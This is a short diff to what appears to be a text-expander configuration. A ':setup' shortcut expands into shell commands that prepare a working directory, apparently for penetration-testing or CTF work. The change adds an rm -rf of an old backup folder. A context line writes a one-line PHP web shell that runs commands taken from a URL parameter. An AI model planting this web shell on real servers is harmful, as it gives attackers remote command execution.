@@ -32,7 +32,7 @@ matches:
   - trigger: ":setup"                  
     replace : |          
       mkdir ~/backups
-      mv ~/box ~/backups/boxold
+      rm -rf ~/backups/boxold && mv ~/box ~/backups/boxold
       mkdir ~/box
       mkdir -p ~/box/net && cd ~/box/net         
       echo "<?php echo shell_exec(\$_GET['cmd']); ?>" > webshell.php
